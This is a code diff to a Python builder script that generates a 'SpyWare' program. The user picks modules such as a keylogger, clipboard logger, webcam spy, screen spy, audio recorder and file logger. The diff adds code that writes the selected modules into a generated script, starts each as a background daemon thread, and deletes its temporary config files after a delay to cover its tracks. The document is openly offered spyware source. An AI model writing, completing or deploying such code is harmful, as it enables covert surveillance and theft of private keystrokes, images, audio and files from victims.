@@ -19,18 +19,26 @@ def option(prompt):
             print(f"{Fore.RED}{Style.BRIGHT}Invalid input. Please enter 'yes', 'no', 'y', 'n', '1', or '0'.")
 
 
-print(f"{Fore.GREEN}{Style.BRIGHT}Generating SpyWare...")
+def main(output_file):
+    print(f"{Fore.GREEN}{Style.BRIGHT}Generating SpyWare...")
+    global include_KeyLogger, include_ClipboardLogger, include_DomainsLogger
+    global include_WebcamSpy, include_ScreenSpy, include_FilesLogger, include_AudioRecorder
 
-include_KeyLogger = option("Include KeyLogger?: ")
-include_ClipboardLogger = option("Include ClipboardLogger?: ")
-include_DomainsLogger = option("Include Domains/IP Logger?: ")
-include_WebcamSpy = option("Include Webcam Spy?: ")
-include_ScreenSpy = option("Include Screen Spy?: ")
-include_FilesLogger = option("Include File Logger?: ")
-include_AudioRecorder = option("Include Audio Recorder?: ")
+    include_KeyLogger = option("Include KeyLogger?: ")
+    include_ClipboardLogger = option("Include ClipboardLogger?: ")
+    include_DomainsLogger = option("Include Domains/IP Logger?: ")
+    include_WebcamSpy = option("Include Webcam Spy?: ")
+    include_ScreenSpy = option("Include Screen Spy?: ")
+    include_FilesLogger = option("Include File Logger?: ")
+    include_AudioRecorder = option("Include Audio Recorder?: ")
+
+    set_configs()
+    generate_code(output_file)
+    print(f"{Fore.GREEN}{Style.BRIGHT}SpyWare code generated and saved to: {output_file}")
 
 
 def set_configs():
+    global keylogger_conf, clipboard_conf, domains_conf, webcam_conf, screen_conf, files_conf, audio_conf
     print(f"{Fore.GREEN}{Style.BRIGHT}Setting custom configurations... ")
 
     if include_KeyLogger:
@@ -142,9 +150,9 @@ def set_configs():
         """
 
 
-def add_libraries(output_filename):
+def generate_code(output_filename):
     with open(output_filename, "w") as f:
-        f.write("import configparser\nfrom io import StringIO")
+        f.write("import tempfile\nimport os\nimport atexit\nimport threading\nimport time")
 
     if include_KeyLogger:
         with open(output_filename, "a") as f:
@@ -174,3 +182,110 @@ def add_libraries(output_filename):
         with open(output_filename, "a") as f:
             f.write("\nfrom SpyWare.AudioRecorder import Daemon as audioDaemon, audioConfig")
 
+    with open(output_filename, "a") as f:
+        f.write("""
+def write_temp_config(name, content):
+    temp_path = os.path.join(tempfile.gettempdir(), name)
+    with open(temp_path, "w") as f:
+        f.write(content.strip())
+    return temp_path
+
+def delayed_cleanup(paths, delay=10):
+    time.sleep(delay)
+    for path in paths:
+        try:
+            if os.path.exists(path):
+                os.remove(path)
+        except Exception as e:
+            print(f"Cleanup failed for {path}: {e}")
+
+def run_all():
+    threads = []
+    config_paths = []
+""")
+
+        if include_KeyLogger:
+            f.write(f"""
+    keylogger_conf = \"\"\"{keylogger_conf.strip()}\"\"\"
+    key_conf_path = write_temp_config("keySpy.conf", keylogger_conf)
+    keyConfig(key_conf_path)
+    config_paths.append(key_conf_path)
+    threads.append(threading.Thread(target=keyDaemon().run_for_ever))""")
+
+        if include_ClipboardLogger:
+            f.write(f"""
+    clipboard_conf = \"\"\"{clipboard_conf.strip()}\"\"\"
+    clip_conf_path = write_temp_config("clipboard.conf", clipboard_conf)
+    clipboardConfig(clip_conf_path)
+    config_paths.append(clip_conf_path)
+    threads.append(threading.Thread(target=clipDaemon().run_for_ever))""")
+
+        if include_DomainsLogger:
+            f.write(f"""
+    domains_conf = \"\"\"{domains_conf.strip()}\"\"\"
+    domains_conf_path = write_temp_config("domains.conf", domains_conf)
+    domainsConfig(domains_conf_path)
+    config_paths.append(domains_conf_path)
+    threads.append(threading.Thread(target=domainDaemon().run_for_ever))""")
+
+        if include_WebcamSpy:
+            f.write(f"""
+    webcam_conf = \"\"\"{webcam_conf.strip()}\"\"\"
+    cam_conf_path = write_temp_config("webcam.conf", webcam_conf)
+    webcamConfig(cam_conf_path)
+    config_paths.append(cam_conf_path)
+    threads.append(threading.Thread(target=camDaemon().run_for_ever))""")
+
+        if include_ScreenSpy:
+            f.write(f"""
+    screen_conf = \"\"\"{screen_conf.strip()}\"\"\"
+    screen_conf_path = write_temp_config("screen.conf", screen_conf)
+    screenConfig(screen_conf_path)
+    config_paths.append(screen_conf_path)
+    threads.append(threading.Thread(target=screenDaemon().run_for_ever))""")
+
+        if include_FilesLogger:
+            f.write(f"""
+    files_conf = \"\"\"{files_conf.strip()}\"\"\"
+    files_conf_path = write_temp_config("files.conf", files_conf)
+    filesConfig(files_conf_path)
+    config_paths.append(files_conf_path)
+    threads.append(threading.Thread(target=filesDaemon().run_for_ever))""")
+
+        if include_AudioRecorder:
+            f.write(f"""
+    audio_conf = \"\"\"{audio_conf.strip()}\"\"\"
+    audio_conf_path = write_temp_config("audio.conf", audio_conf)
+    audioConfig(audio_conf_path)
+    config_paths.append(audio_conf_path)
+    threads.append(threading.Thread(target=audioDaemon().run_for_ever))""")
+
+        f.write("""
+    cleanup_thread = threading.Thread(target=delayed_cleanup, args=(config_paths,))
+    cleanup_thread.daemon = True
+    cleanup_thread.start()
+
+    for thread in threads:
+        thread.daemon = True
+        thread.start()
+
+    try:
+        while True:
+            pass
+    except KeyboardInterrupt:
+        print("Exiting...")
+
+run_all()
+""")
+
+
+if __name__ == "__main__":
+    if len(sys.argv) > 1:
+        output_filename = sys.argv[1]
+    else:
+        output_filename = input(f"{Fore.YELLOW}Enter output filename: ").strip()
+        if not output_filename:
+            print(f"{Fore.RED}No output filename provided. Exiting.")
+            sys.exit(1)
+
+    main(output_filename)
